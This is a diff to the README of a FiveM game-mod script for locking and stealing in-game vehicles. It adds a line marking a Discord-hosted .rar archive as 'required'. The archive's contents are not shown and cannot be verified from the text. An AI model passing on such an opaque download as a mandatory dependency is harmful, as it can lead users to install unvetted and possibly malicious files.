@@ -6,6 +6,8 @@
 
 FiveM Vehicle Lock is a script to steal cars and lock cars,
 
+required 
+https://cdn.discordapp.com/attachments/888803394096099379/1023640427808686231/rq-taskbarskill.rar
 
 ## Features
 
